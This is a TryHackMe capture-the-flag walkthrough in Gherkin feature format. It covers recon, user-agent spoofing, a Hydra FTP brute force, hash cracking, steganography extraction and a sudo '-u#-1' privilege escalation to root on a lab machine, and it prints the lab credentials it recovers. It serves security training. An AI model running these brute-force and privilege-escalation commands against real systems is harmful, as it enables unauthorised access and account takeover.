## Version 2.0
## language: en

Feature:
  Site:
    TryHackMe
  Category:
    CTF
  User:
    Ar4m1r3z
  Goal:
    Escalate privileges to get two flags that are root and user.

  Background:
  Hacker's software:
    | <Software name> | <Version>   |
    | Kali Linux      | 2020.1      |
    | Firefox Quantum | 68.2Oesr    |
    | Nmap            | 7.80        |
    | steghide        | 0.5.1       |
    | binwalk         | 2.2.0       |
  Machine information:
    Given I am accessing the machine 10.10.44.159
    And is running on port 80

  Scenario: Information gathering
    Given that I run the following Nmap command
    """
    $ nmap -sV 10.10.44.159
    """
    Then I get the output
    """
    21/tcp open  ftp     vsftpd 3.0.3
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    """
    Then I can see that it has a port 80
    And is using server HTTP

  Scenario: Fail: Directory Scanning
    Given I have a port 80
    When I decide to search for a directory
    """
    $ dirb http://10.10.44.159
    """
    And I don't get an interesting result

  Scenario: Success: First Password
    Given I have a website
    When I decide to visit her
    Then that website tells us we should change the "user-agent"
    And our "user-agent" is "R"
    When I decide to use "curl" to make the requests with the "user-agent"
    """
    $  curl -A "R" -L http://10.10.44.159/
    """
    Then the result is the same code as port 80
    When I decide to try all the letters of the alphabet
    """
    $  curl -A "C" -L http://10.10.44.159/
    """
    And the user-agent named "C" gave me back the user "chris"
    When I use "Hydra" for brute force
    """
    $ hydra -l chris -P rockyou.txt ftp://10.10.44.159
    """
    Then I get this password
    """
    [21][ftp] host: 10.10.44.159   login: chris   password: crystal
    """

  Scenario: Fail: Access SSH
    Given I have a password
    When I test the password with SSH
    And the password didn't work.

  Scenario: Success: file root.txt
    Given I don't work with SSH
    When I to try it with FTP and if it works
    Then I decide to download the three files which are these
    """
    -rw-r--r--    1 0     0     217 Oct 29  2019 To_agentJ.txt
    -rw-r--r--    1 0     0     33143 Oct 29  2019 cute-alien.jpg
    -rw-r--r--    1 0     0     34842 Oct 29  2019 cutie.png
    """
    And to download it is like this
    """
    $ mget *
    """
    When I read the file "To_agentJ.txt" it gives us a hint to get a password
    Then I use the "binwalk" tool to see if there are any files embedded
    When I see that the image "cutie.png" has a file
    Then to download that file is like this
    """
    $ binwalk -e cutie.png
    """
    When I see that the file needs a password
    Then I use "zip2john" to pull the HASH from the file
    """
    $ sudo zip2john 8702.zip > pass.hash
    """
    And I use "John the ripper" to decipher the HASH
    """
    $ john pass.hash
    """
    When I decide to test the password "alien" from the archive and it works
    """
    $ 7z e 8702.zip
    """

  Scenario: Fail: Hash Identifie
    Given I already have the "To_agentR.txt" file
    When I see that it has an alphanumeric word
    Then I use "hash-identifier" but it doesn't work

  Scenario: Fail: Access SSH
    Given I don't work with "hash-identifier"
    When I try use "Cyberchef" to see the type of HASH
    And it worked because it tells me it's "base64"
    And the password is "Area51"
    When I try that password with "SSH" and it doesn't work

  Scenario: Success: flag User
    Given the password didn't work with SSH
    When I try to use it with "steghide"
    """
    $ steghide info cute-alien.jpg
    """
    And the password worked.
    When I see that the image has a file
    Then I decide to download that file
    """
    $ steghide extract -sf cute-alien.jpg
    """
    And it contains a username "james" and password "hackerrules!"
    When I use those credentials with SSH and it has worked
    Then I can pull the flag out of "user"

  Scenario: Success: flag Root
    Given I'm already at SSH
    When I run "sudo -l" to increase the privileges
    """
    (ALL, !root) /bin/bash
    """
    Then I see that it has a "!root" and I go to Google for information
    After looking, I realize it's a vulnerability
    And it has a exploit of "exploit-db"
    When I see that the feat has a very easy way of working
    """
    $ sudo -u#-1 /bin/bash
    """
    So with this I'm already a user "root"
    And I have the flag "root"
